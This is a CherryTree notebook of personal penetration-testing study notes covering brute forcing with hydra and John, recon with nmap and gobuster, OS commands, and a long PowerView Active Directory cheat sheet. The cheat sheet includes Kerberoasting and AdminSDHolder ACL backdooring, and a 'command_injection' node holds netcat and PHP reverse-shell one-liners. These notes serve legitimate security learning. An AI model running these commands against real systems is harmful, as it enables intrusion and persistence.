<?xml version="1.0" ?>
<cherrytree>
	<node custom_icon_id="0" foreground="" is_bold="False" name="bruteforce_cracking" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655393552.82" ts_lastsave="1655481351.61" unique_id="1">
		<rich_text></rich_text>
		<node custom_icon_id="0" foreground="" is_bold="False" name="hydra" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655393562.61" ts_lastsave="1655393676.75" unique_id="2">
			<rich_text>SSH bruteforce
hydra -l &lt;username&gt; -P &lt;password_file&gt; &lt;ip&gt; ssh 
hydra -L &lt;username_file&gt; -P &lt;password_file&gt; &lt;ip&gt; ssh

ftp bruteforce
hydra -l &lt;username&gt; -P &lt;password_file&gt; &lt;ip&gt; ftp 
hydra -L &lt;username_file&gt; -P &lt;password_file&gt; &lt;ip&gt; ftp 

http-post
hydra -L &lt;username_file&gt; -P &lt;password_file&gt; &lt;host&gt; https-post-form &quot;/api/login:username=^USER^&amp;password=^PASS^:Incorrect credentials&quot;</rich_text>
		</node>
		<node custom_icon_id="0" foreground="" is_bold="False" name="fcrackzip" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655393573.93" ts_lastsave="1655393597.21" unique_id="3">
			<rich_text>fcrackzip -u -D -p &lt;wordlist&gt; &lt;file&gt;</rich_text>
		</node>
		<node custom_icon_id="0" foreground="" is_bold="False" name="john_the_ripper" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655481131.37" ts_lastsave="1655483291.74" unique_id="38">
			<rich_text>automatic cracking
john --wordlist=[path to wordlist] [path to file]

hash identifier
wget https://gitlab.com/kalilinux/packages/hash-identifier/-/raw/kali/master/hash-id.py
python3 hash-id.py

unshadow [path to passwd] [path to shadow]

specify format
john --wordlist=/usr/share/wordlists/rockyou.txt --format=sha512crypt unshadowed.txt

</rich_text>
			<rich_text family="monospace">rar2john [rar file] &gt; [output file]</rich_text>
			<rich_text>

</rich_text>
			<rich_text family="monospace">john --wordlist=/usr/share/wordlists/rockyou.txt rar_hash.txt</rich_text>
			<rich_text>
</rich_text>
		</node>
	</node>
	<node custom_icon_id="0" foreground="" is_bold="False" name="compressions" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655393695.98" ts_lastsave="1655393786.4" unique_id="4">
		<rich_text></rich_text>
		<node custom_icon_id="0" foreground="" is_bold="False" name="gzip" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655393716.4" ts_lastsave="1655393739.78" unique_id="5">
			<rich_text>gzip -d &lt;file_name&gt;</rich_text>
		</node>
		<node custom_icon_id="0" foreground="" is_bold="False" name="tar" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655393725.7" ts_lastsave="1655393747.09" unique_id="6">
			<rich_text>decompress
tar -xf &lt;file_name&gt;</rich_text>
		</node>
		<node custom_icon_id="0" foreground="" is_bold="False" name="zip" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655393728.9" ts_lastsave="1655393753.2" unique_id="7">
			<rich_text>decompress 
unzip &lt;zip_file&gt;</rich_text>
		</node>
	</node>
	<node custom_icon_id="0" foreground="" is_bold="False" name="database" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655393786.4" ts_lastsave="1655393844.95" unique_id="8">
		<rich_text></rich_text>
		<node custom_icon_id="0" foreground="" is_bold="False" name="sqllite" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655393789.79" ts_lastsave="1655393790.81" unique_id="9">
			<rich_text>using sqllite for .db file
sqlite3 &lt;database-name&gt;

checking all table names
.tables

check column from table
PRAGMA table_info(&lt;table_name&gt;);</rich_text>
		</node>
	</node>
	<node custom_icon_id="0" foreground="" is_bold="False" name="forensics" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655393844.95" ts_lastsave="1655393999.91" unique_id="10">
		<rich_text></rich_text>
		<node custom_icon_id="0" foreground="" is_bold="False" name="exiftool" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655393848.84" ts_lastsave="1655393858.83" unique_id="11">
			<rich_text>install:
sudo apt install poppler-utils

extract image metadata:
exiftool &lt;image_file&gt;</rich_text>
		</node>
		<node custom_icon_id="0" foreground="" is_bold="False" name="PDFinfo" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655393858.83" ts_lastsave="1655393859.33" unique_id="12">
			<rich_text>install
sudo apt install pdfinfo

extracting metadata
pdfinfo &lt;file_pdf&gt;</rich_text>
		</node>
	</node>
	<node custom_icon_id="0" foreground="" is_bold="False" name="networking" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655393999.91" ts_lastsave="1655395231.37" unique_id="13">
		<rich_text foreground="#d4d4d4">OpenVPN connect
sudo openvpn &lt;file_input&gt;</rich_text>
		<rich_text>

</rich_text>
		<rich_text foreground="#d4d4d4">connect to smbshare
smbclient //[IP]/[SHARE] -U &lt;username&gt; -p &lt;port&gt;</rich_text>
		<rich_text>

</rich_text>
		<rich_text foreground="#d4d4d4">FTP normal
ftp &lt;host&gt;</rich_text>
		<rich_text>

</rich_text>
		<rich_text foreground="#d4d4d4">FTP abnormal port
ftp &lt;host&gt; -p &lt;port&gt;</rich_text>
		<rich_text>

</rich_text>
		<rich_text foreground="#d4d4d4">inside FTP commands</rich_text>
		<rich_text>
</rich_text>
		<rich_text foreground="#d4d4d4">download file FTP
get &lt;file&gt;</rich_text>
		<rich_text>

</rich_text>
		<rich_text foreground="#dcdcaa">read</rich_text>
		<rich_text foreground="#d4d4d4"> file FTP
more &lt;file&gt;</rich_text>
		<rich_text>

</rich_text>
		<rich_text foreground="#d4d4d4">ssh normal
ssh &lt;host&gt;</rich_text>
		<rich_text>

</rich_text>
		<rich_text foreground="#d4d4d4">ssh abnormal port
ssh &lt;host&gt; -p &lt;port&gt;</rich_text>
		<rich_text>

</rich_text>
		<rich_text foreground="#d4d4d4">SCP
scp &lt;source_file&gt; &lt;destination_file&gt;
scp important.txt ubuntu@192.168.1.30:/home/ubuntu/transferred.txt</rich_text>
		<rich_text>

</rich_text>
		<rich_text foreground="#d4d4d4">download or get via http
wget </rich_text>
		<rich_text foreground="#d4d4d4" link="webs https://assets.tryhackme.com/additional/linux-fundamentals/part3/myfile.txt">https://assets.tryhackme.com/additional/linux-fundamentals/part3/myfile.txt</rich_text>
		<rich_text foreground="#d4d4d4">
curl https://assets.tryhackme.com/additional/linux-fundamentals/part3/myfile.txt</rich_text>
		<rich_text>

</rich_text>
		<rich_text foreground="#d4d4d4">listen </rich_text>
		<rich_text foreground="#c586c0">for</rich_text>
		<rich_text foreground="#d4d4d4"> specific packet
sudo tcpdump &lt;ip&gt; proto &lt;protocol -- i.e. </rich_text>
		<rich_text foreground="#d7ba7d">\\</rich_text>
		<rich_text foreground="#d4d4d4">tcmp&gt; -i &lt;network interface i.e tun0&gt;</rich_text>
		<rich_text>

</rich_text>
		<rich_text foreground="#d4d4d4">netcat listen
nc -lvp [listening port]</rich_text>
		<rich_text>

</rich_text>
		<rich_text foreground="#d4d4d4">connect to tellnet
telnet &lt;ip&gt; &lt;port&gt;</rich_text>
	</node>
	<node custom_icon_id="0" foreground="" is_bold="False" name="os_commands" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655394169.77" ts_lastsave="1655394196.01" unique_id="14">
		<rich_text></rich_text>
		<node custom_icon_id="0" foreground="" is_bold="False" name="linux" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655394178.07" ts_lastsave="1655394355.83" unique_id="15">
			<rich_text>knowing filetype
file &lt;filename&gt;

create new user
sudo useradd &lt;username&gt;
sudo passwd &lt;username&gt;

delet new user
userdel username

switching user
su &lt;username&gt;

viewing process
ps

viewing process run by other user (in example by system)
ps aux

stop process
kill &lt;process_pid&gt;

starting sevice
systemctl start &lt;service_name&gt;

stopping sevice
systemctl stop &lt;service_name&gt;</rich_text>
			<node custom_icon_id="0" foreground="" is_bold="False" name="text_processing" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655394284.9" ts_lastsave="1655481308.89" unique_id="21">
				<rich_text foreground="#d4d4d4">default
cat &lt;file&gt; | grep &lt;search&gt;</rich_text>
				<rich_text>

</rich_text>
				<rich_text foreground="#c586c0">case</rich_text>
				<rich_text foreground="#d4d4d4"> insensitive
cat &lt;file&gt; | grep -i &lt;search&gt;</rich_text>
				<rich_text>

</rich_text>
				<rich_text foreground="#d4d4d4">does not contain
cat &lt;file&gt; | grep -n &lt;search&gt;</rich_text>
				<rich_text>

</rich_text>
				<rich_text foreground="#d4d4d4">sort result unique
cat &lt;file&gt; | grep &lt;search&gt; | sort -u</rich_text>
				<rich_text>

</rich_text>
				<rich_text foreground="#d4d4d4">count by new line
cat &lt;file&gt; | wc -l</rich_text>
				<rich_text>

</rich_text>
				<rich_text foreground="#d4d4d4">count by char
cat &lt;file&gt; | wc -</rich_text>
				<rich_text>c

</rich_text>
				<rich_text foreground="#d4d4d4">cutting table like string
cat &lt;file&gt; | cut -d &lt;delimiter&gt; -f &lt;position starts from 1&gt;</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="utilities" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655394355.83" ts_lastsave="1655394356.41" unique_id="22">
				<rich_text>finding files
locate &lt;filename&gt;

finding file other
find -name &lt;filename_can_wildcard&gt;</rich_text>
			</node>
		</node>
		<node custom_icon_id="0" foreground="" is_bold="False" name="windows" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655394181.49" ts_lastsave="1655649452.75" unique_id="16">
			<rich_text></rich_text>
			<node custom_icon_id="0" foreground="" is_bold="False" name="cmd" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655394591.77" ts_lastsave="1655394602.23" unique_id="23">
				<rich_text>get hostname / pc name
hostname

get username
whoami

check network config
ipconfig

detailed ipconfig
ipconfig /all

netstat this command will display protocol statistics and current TCP/IP network connections. 
netstat

netstat good default
netstat -a -b -f

netstat help
netstat /?

net command is primarily used to manage network resources.
net

net help
net help

call control panel
control

control panel update config
control /name Microsoft.WindowsUpdate</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="env_path" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655394602.23" ts_lastsave="1655394612.52" unique_id="24">
				<rich_text>windows root directory
%windir%</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="GUI" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655394612.52" ts_lastsave="1655394630.38" unique_id="25">
				<rich_text>make user:
Start menu &gt;&gt; type &quot;Other User&quot; &gt;&gt; Add user

system environment variable
Control Panel &gt; System and Security &gt; System &gt; Advanced system settings &gt; Environment Variables 
or 
Settings &gt; System &gt; About &gt; system info &gt; Advanced system settings &gt; Environment Variable</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="run" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655394630.38" ts_lastsave="1655394636.88" unique_id="26">
				<rich_text>user and group manager
lusrmgr.msc

microsoft configuration
msconfig

user account settings
UserAccountControlSettings.exe

computer management
compmgmt.msc

perfmon manager
perfmon

system information
msinfo32.exe

resource manager
resmon.exe

registry edit
regedit

windows firewall
WF.msc</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="powershell" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655649452.75" ts_lastsave="1655725264.25" unique_id="39">
				<rich_text>bypass execution policy
</rich_text>
				<rich_text family="monospace">powershell -ep bypass</rich_text>
				<rich_text>

importing (?) powerview script
</rich_text>
				<rich_text family="monospace">. .\PowerView.ps1</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="powerview" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655649812.22" ts_lastsave="1655727658.53" unique_id="40">
				<rich_text link="webs https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993">https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993</rich_text>
				<rich_text>

get fulldata and selecting OS
Get-NetComputer -fulldata | select operatingsystem

get users and selecting domain name
</rich_text>
				<rich_text family="monospace">Get-NetUser | select cn</rich_text>
				<rich_text>

show all group
Get-NetGroup

# PowerView's last major overhaul is detailed here: http://www.harmj0y.net/blog/powershell/make-powerview-great-again/
#   tricks for the 'old' PowerView are at https://gist.github.com/HarmJ0y/3328d954607d71362e3c

# the most up-to-date version of PowerView will always be in the dev branch of PowerSploit:
#   https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1

# New function naming schema:
#   Verbs:
#       Get : retrieve full raw data sets
#       Find : ‘find’ specific data entries in a data set
#       Add : add a new object to a destination
#       Set : modify a given object
#       Invoke : lazy catch-all
#   Nouns:
#       Verb-Domain* : indicates that LDAP/.NET querying methods are being executed
#       Verb-WMI* : indicates that WMI is being used under the hood to execute enumeration
#       Verb-Net* : indicates that Win32 API access is being used under the hood


# get all the groups a user is effectively a member of, 'recursing up' using tokenGroups
Get-DomainGroup -MemberIdentity &lt;User/Group&gt;

# get all the effective members of a group, 'recursing down'
Get-DomainGroupMember -Identity &quot;Domain Admins&quot; -Recurse

# use an alterate creadential for any function
$SecPassword = ConvertTo-SecureString 'BurgerBurgerBurger!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-DomainUser -Credential $Cred

# retrieve all the computer dns host names a GPP password applies to
Get-DomainOU -GPLink '&lt;GPP_GUID&gt;' | % {Get-DomainComputer -SearchBase $_.distinguishedname -Properties dnshostname}

# get all users with passwords changed &gt; 1 year ago, returning sam account names and password last set times
$Date = (Get-Date).AddYears(-1).ToFileTime()
Get-DomainUser -LDAPFilter &quot;(pwdlastset&lt;=$Date)&quot; -Properties samaccountname,pwdlastset

# all enabled users, returning distinguishednames
Get-DomainUser -LDAPFilter &quot;(!userAccountControl:1.2.840.113556.1.4.803:=2)&quot; -Properties distinguishedname
Get-DomainUser -UACFilter NOT_ACCOUNTDISABLE -Properties distinguishedname

# all disabled users
Get-DomainUser -LDAPFilter &quot;(userAccountControl:1.2.840.113556.1.4.803:=2)&quot;
Get-DomainUser -UACFilter ACCOUNTDISABLE

# all users that require smart card authentication
Get-DomainUser -LDAPFilter &quot;(useraccountcontrol:1.2.840.113556.1.4.803:=262144)&quot;
Get-DomainUser -UACFilter SMARTCARD_REQUIRED

# all users that *don't* require smart card authentication, only returning sam account names
Get-DomainUser -LDAPFilter &quot;(!useraccountcontrol:1.2.840.113556.1.4.803:=262144)&quot; -Properties samaccountname
Get-DomainUser -UACFilter NOT_SMARTCARD_REQUIRED -Properties samaccountname

# use multiple identity types for any *-Domain* function
'S-1-5-21-890171859-3433809279-3366196753-1114', 'CN=dfm,CN=Users,DC=testlab,DC=local','4c435dd7-dc58-4b14-9a5e-1fdb0e80d201','administrator' | Get-DomainUser -Properties samaccountname,lastlogoff

# find all users with an SPN set (likely service accounts)
Get-DomainUser -SPN

# check for users who don't have kerberos preauthentication set
Get-DomainUser -PreauthNotRequired
Get-DomainUser -UACFilter DONT_REQ_PREAUTH

# find all service accounts in &quot;Domain Admins&quot;
Get-DomainUser -SPN | ?{$_.memberof -match 'Domain Admins'}

# find users with sidHistory set
Get-DomainUser -LDAPFilter '(sidHistory=*)'

# find any users/computers with constrained delegation st
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth

# enumerate all servers that allow unconstrained delegation, and all privileged users that aren't marked as sensitive/not for delegation
$Computers = Get-DomainComputer -Unconstrained
$Users = Get-DomainUser -AllowDelegation -AdminCount

# return the local *groups* of a remote server
    

# return the local group *members* of a remote server using Win32 API methods (faster but less info)
Get-NetLocalGroupMember -Method API -ComputerName SERVER.domain.local

# Kerberoast any users in a particular OU with SPNs set
Invoke-Kerberoast -SearchBase &quot;LDAP://OU=secret,DC=testlab,DC=local&quot;

# Find-DomainUserLocation == old Invoke-UserHunter
# enumerate servers that allow unconstrained Kerberos delegation and show all users logged in
Find-DomainUserLocation -ComputerUnconstrained -ShowAll

# hunt for admin users that allow delegation, logged into servers that allow unconstrained delegation
Find-DomainUserLocation -ComputerUnconstrained -UserAdminCount -UserAllowDelegation

# find all computers in a given OU
Get-DomainComputer -SearchBase &quot;ldap://OU=...&quot;

# Get the logged on users for all machines in any *server* OU in a particular domain
Get-DomainOU -Identity *server* -Domain &lt;domain&gt; | %{Get-DomainComputer -SearchBase $_.distinguishedname -Properties dnshostname | %{Get-NetLoggedOn -ComputerName $_}}

# enumerate all gobal catalogs in the forest
Get-ForestGlobalCatalog

# turn a list of computer short names to FQDNs, using a global catalog
gc computers.txt | % {Get-DomainComputer -SearchBase &quot;GC://GLOBAL.CATALOG&quot; -LDAP &quot;(name=$_)&quot; -Properties dnshostname}

# enumerate the current domain controller policy
$DCPolicy = Get-DomainPolicy -Policy DC
$DCPolicy.PrivilegeRights # user privilege rights on the dc...

# enumerate the current domain policy
$DomainPolicy = Get-DomainPolicy -Policy Domain
$DomainPolicy.KerberosPolicy # useful for golden tickets ;)
$DomainPolicy.SystemAccess # password age/etc.

# enumerate what machines that a particular user/group identity has local admin rights to
#   Get-DomainGPOUserLocalGroupMapping == old Find-GPOLocation
Get-DomainGPOUserLocalGroupMapping -Identity &lt;User/Group&gt;

# enumerate what machines that a given user in the specified domain has RDP access rights to
Get-DomainGPOUserLocalGroupMapping -Identity &lt;USER&gt; -Domain &lt;DOMAIN&gt; -LocalGroup RDP

# export a csv of all GPO mappings
Get-DomainGPOUserLocalGroupMapping | %{$_.computers = $_.computers -join &quot;, &quot;; $_} | Export-CSV -NoTypeInformation gpo_map.csv

# use alternate credentials for searching for files on the domain
#   Find-InterestingDomainShareFile == old Invoke-FileFinder
$Password = &quot;PASSWORD&quot; | ConvertTo-SecureString -AsPlainText -Force
$Credential = New-Object System.Management.Automation.PSCredential(&quot;DOMAIN\user&quot;,$Password)
Find-InterestingDomainShareFile -Domain DOMAIN -Credential $Credential

# enumerate who has rights to the 'matt' user in 'testlab.local', resolving rights GUIDs to names
Get-DomainObjectAcl -Identity matt -ResolveGUIDs -Domain testlab.local

# grant user 'will' the rights to change 'matt's password
Add-DomainObjectAcl -TargetIdentity matt -PrincipalIdentity will -Rights ResetPassword -Verbose

# audit the permissions of AdminSDHolder, resolving GUIDs
Get-DomainObjectAcl -SearchBase 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -ResolveGUIDs

# backdoor the ACLs of all privileged accounts with the 'matt' account through AdminSDHolder abuse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All

# retrieve *most* users who can perform DC replication for dev.testlab.local (i.e. DCsync)
Get-DomainObjectAcl &quot;dc=dev,dc=testlab,dc=local&quot; -ResolveGUIDs | ? {
    ($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')
}

# find linked DA accounts using name correlation
Get-DomainGroupMember 'Domain Admins' | %{Get-DomainUser $_.membername -LDAPFilter '(displayname=*)'} | %{$a=$_.displayname.split(' ')[0..1] -join ' '; Get-DomainUser -LDAPFilter &quot;(displayname=*$a*)&quot; -Properties displayname,samaccountname}

# save a PowerView object to disk for later usage
Get-DomainUser | Export-Clixml user.xml
$Users = Import-Clixml user.xml

# Find any machine accounts in privileged groups
Get-DomainGroup -AdminCount | Get-DomainGroupMember -Recurse | ?{$_.MemberName -like '*$'}

# Enumerate permissions for GPOs where users with RIDs of &gt; -1000 have some kind of modification/control rights
Get-DomainObjectAcl -LDAPFilter '(objectCategory=groupPolicyContainer)' | ? { ($_.SecurityIdentifier -match '^S-1-5-.*-[1-9]\d{3,}$') -and ($_.ActiveDirectoryRights -match 'WriteProperty|GenericAll|GenericWrite|WriteDacl|WriteOwner')}

# find all policies applied to a current machine
Get-DomainGPO -ComputerIdentity windows1.testlab.local

# enumerate all groups in a domain that don't have a global scope, returning just group names
Get-DomainGroup -GroupScope NotGlobal -Properties name

# enumerate all foreign users in the global catalog, and query the specified domain localgroups for their memberships
#   query the global catalog for foreign security principals with domain-based SIDs, and extract out all distinguishednames
$ForeignUsers = Get-DomainObject -Properties objectsid,distinguishedname -SearchBase &quot;GC://testlab.local&quot; -LDAPFilter '(objectclass=foreignSecurityPrincipal)' | ? {$_.objectsid -match '^S-1-5-.*-[1-9]\d{2,}$'} | Select-Object -ExpandProperty distinguishedname
$Domains = @{}
$ForeignMemberships = ForEach($ForeignUser in $ForeignUsers) {
    # extract the domain the foreign user was added to
    $ForeignUserDomain = $ForeignUser.SubString($ForeignUser.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
    # check if we've already enumerated this domain
    if (-not $Domains[$ForeignUserDomain]) {
        $Domains[$ForeignUserDomain] = $True
        # enumerate all domain local groups from the given domain that have membership set with our foreignSecurityPrincipal set
        $Filter = &quot;(|(member=&quot; + $($ForeignUsers -join &quot;)(member=&quot;) + &quot;))&quot;
        Get-DomainGroup -Domain $ForeignUserDomain -Scope DomainLocal -LDAPFilter $Filter -Properties distinguishedname,member
    }
}
$ForeignMemberships | fl

# if running in -sta mode, impersonate another credential a la &quot;runas /netonly&quot;
$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Invoke-UserImpersonation -Credential $Cred
# ... action
Invoke-RevertToSelf

# enumerates computers in the current domain with 'outlier' properties, i.e. properties not set from the firest result returned by Get-DomainComputer
Get-DomainComputer -FindOne | Find-DomainObjectPropertyOutlier

# set the specified property for the given user identity
Set-DomainObject testuser -Set @{'mstsinitialprogram'='\\EVIL\program.exe'} -Verbose

# Set the owner of 'dfm' in the current domain to 'harmj0y'
Set-DomainObjectOwner -Identity dfm -OwnerIdentity harmj0y

# retrieve *most* users who can perform DC replication for dev.testlab.local (i.e. DCsync)
Get-ObjectACL &quot;DC=testlab,DC=local&quot; -ResolveGUIDs | ? {
    ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ObjectAceType -match 'Replication-Get')
}

# check if any user passwords are set
$FormatEnumerationLimit=-1;Get-DomainUser -LDAPFilter '(userPassword=*)' -Properties samaccountname,memberof,userPassword | % {Add-Member -InputObject $_ NoteProperty 'Password' &quot;$([System.Text.Encoding]::ASCII.GetString($_.userPassword))&quot; -PassThru} | fl
</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="metasploit" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655727658.53" ts_lastsave="1655727658.53" unique_id="41">
				<rich_text></rich_text>
			</node>
		</node>
	</node>
	<node custom_icon_id="0" foreground="" is_bold="False" name="python_module" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655394196.01" ts_lastsave="1655394751.18" unique_id="17">
		<rich_text></rich_text>
		<node custom_icon_id="0" foreground="" is_bold="False" name="SimpleHTTPServer" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655394751.18" ts_lastsave="1655394754.88" unique_id="27">
			<rich_text>python -m SimpleHTTPServer &lt;port&gt;
python3 -m http.server &lt;port&gt;</rich_text>
		</node>
	</node>
	<node custom_icon_id="0" foreground="" is_bold="False" name="recon" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655394208.07" ts_lastsave="1655394769.66" unique_id="18">
		<rich_text></rich_text>
		<node custom_icon_id="0" foreground="" is_bold="False" name="enum4linux" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655394769.66" ts_lastsave="1655394791.58" unique_id="28">
			<rich_text>SMBShare enumeration
enum4linux -a &lt;ip&gt;</rich_text>
		</node>
		<node custom_icon_id="0" foreground="" is_bold="False" name="general_network_recon" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655394791.58" ts_lastsave="1655394811.27" unique_id="29">
			<rich_text>ping
ping &lt;ip/domain_target&gt;

traceroute
tracert &lt;ip/domain_target&gt;

dig
dig &lt;ip/domain_target&gt;

whois
whois &lt;ip/domain_target&gt;</rich_text>
		</node>
		<node custom_icon_id="0" foreground="" is_bold="False" name="gobuster" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655394811.27" ts_lastsave="1655471333.24" unique_id="30">
			<rich_text>gobuster dir -u </rich_text>
			<rich_text link="webs http://&lt;url&gt;">http://&lt;url&gt;</rich_text>
			<rich_text> -w &lt;path_to_wordlist&gt;</rich_text>
		</node>
		<node custom_icon_id="0" foreground="" is_bold="False" name="nmap" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655394814.09" ts_lastsave="1655394981.76" unique_id="31">
			<rich_text foreground="#569cd6">default</rich_text>
			<rich_text foreground="#d4d4d4">:</rich_text>
			<rich_text>
</rich_text>
			<rich_text foreground="#ce9178">nmap &lt;host&gt;</rich_text>
			<rich_text>

</rich_text>
			<rich_text foreground="#569cd6">favorite</rich_text>
			<rich_text foreground="#d4d4d4">:</rich_text>
			<rich_text>
</rich_text>
			<rich_text foreground="#ce9178">nmap -sC -sV -v &lt;host&gt;</rich_text>
			<rich_text>

</rich_text>
			<rich_text foreground="#569cd6">favorite BBH</rich_text>
			<rich_text foreground="#d4d4d4">:</rich_text>
			<rich_text>
</rich_text>
			<rich_text foreground="#ce9178">nmap -sC -sV -p- -v &lt;host&gt; -oG &lt;output_file&gt;</rich_text>
			<rich_text>

</rich_text>
			<rich_text foreground="#569cd6">vuln script</rich_text>
			<rich_text foreground="#d4d4d4">:</rich_text>
			<rich_text>
</rich_text>
			<rich_text foreground="#ce9178">nmap --script vuln &lt;host&gt;</rich_text>
			<rich_text>

</rich_text>
			<rich_text foreground="#ce9178">full tcp scan
-sT</rich_text>
			<rich_text>

</rich_text>
			<rich_text foreground="#ce9178">half scan (syn scan, stealth scan)
-sS</rich_text>
			<rich_text>

</rich_text>
			<rich_text foreground="#ce9178">UDP scan
-sU</rich_text>
			<rich_text>

</rich_text>
			<rich_text foreground="#ce9178">ping sweep
nmap -sn i&lt;ip_range i.e 127.0.0.1-255 or CIDR&lt;xxx.xxx.xxx.xxx/yy&gt;</rich_text>
			<rich_text>

</rich_text>
			<rich_text foreground="#ce9178">scripts
safe:- Won't affect the target</rich_text>
			<rich_text>
</rich_text>
			<rich_text foreground="#569cd6">intrusive:- Not safe</rich_text>
			<rich_text foreground="#d4d4d4">: </rich_text>
			<rich_text foreground="#ce9178">likely to affect the target
vuln:- Scan for vulnerabilities
exploit:- Attempt to exploit a vulnerability
auth:- Attempt to bypass authentication for running services (e.g. Log into an FTP server anonymously)
brute:- Attempt to bruteforce credentials for running services
discovery:- Attempt to query running services for further information about the network (e.g. query an SNMP server).</rich_text>
			<rich_text>

</rich_text>
			<rich_text foreground="#569cd6">exhaustive list</rich_text>
			<rich_text foreground="#d4d4d4"> : </rich_text>
			<rich_text foreground="#ce9178">https://nmap.org/book/nse-usage.html</rich_text>
			<rich_text>

</rich_text>
			<rich_text foreground="#ce9178">search for script
grep &quot;ftp&quot; /usr/share/nmap/scripts/script.db</rich_text>
			<rich_text>

</rich_text>
			<rich_text foreground="#ce9178">download new script
sudo wget -O /usr/share/nmap/scripts/&lt;script-name&gt;.nse </rich_text>
			<rich_text foreground="#ce9178" link="webs https://svn.nmap.org/nmap/scripts/&lt;script-name&gt;.nse">https://svn.nmap.org/nmap/scripts/&lt;script-name&gt;.nse</rich_text>
			<rich_text foreground="#ce9178">
nmap --script-updatedb</rich_text>
		</node>
		<node custom_icon_id="0" foreground="" is_bold="False" name="nslookup" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655394818.51" ts_lastsave="1655394997.63" unique_id="32">
			<rich_text>using nslookup to get more info on a website

nslookup --type=A website.thm
nslookup --type=CNAME website.thm
nslookup --type=MX website.thm
nslookup --type=TXT website.thm</rich_text>
		</node>
	</node>
	<node custom_icon_id="0" foreground="" is_bold="False" name="exploit" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655471333.24" ts_lastsave="1655471362.28" unique_id="36">
		<rich_text></rich_text>
	</node>
	<node custom_icon_id="0" foreground="" is_bold="False" name="command_injection" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655471362.28" ts_lastsave="1655471836.88" unique_id="37">
		<rich_text>Reverse
nc 172.16.1.100 1234 -e /bin/sh
php -r '$sock=fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);'</rich_text>
	</node>
	<node custom_icon_id="0" foreground="" is_bold="False" name="tests" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655394210.03" ts_lastsave="1655727693.85" unique_id="19">
		<rich_text></rich_text>
		<node custom_icon_id="0" foreground="" is_bold="False" name="note.dtd" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655395012.38" ts_lastsave="1655395016.26" unique_id="33">
			<rich_text></rich_text>
		</node>
		<node custom_icon_id="0" foreground="" is_bold="False" name="test.xml" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655395016.26" ts_lastsave="1655395043.05" unique_id="34">
			<rich_text foreground="#808080">&lt;?</rich_text>
			<rich_text foreground="#569cd6">xml</rich_text>
			<rich_text foreground="#9cdcfe"> version</rich_text>
			<rich_text foreground="#d4d4d4">=</rich_text>
			<rich_text foreground="#ce9178">&quot;1.0&quot;</rich_text>
			<rich_text foreground="#9cdcfe"> encoding</rich_text>
			<rich_text foreground="#d4d4d4">=</rich_text>
			<rich_text foreground="#ce9178">&quot;UTF-8&quot;</rich_text>
			<rich_text foreground="#808080">?&gt;
&lt;!</rich_text>
			<rich_text foreground="#569cd6">DOCTYPE</rich_text>
			<rich_text foreground="#d4d4d4"> </rich_text>
			<rich_text foreground="#569cd6">note</rich_text>
			<rich_text foreground="#d4d4d4"> SYSTEM &quot;note.dtd&quot;</rich_text>
			<rich_text foreground="#808080">&gt;
&lt;</rich_text>
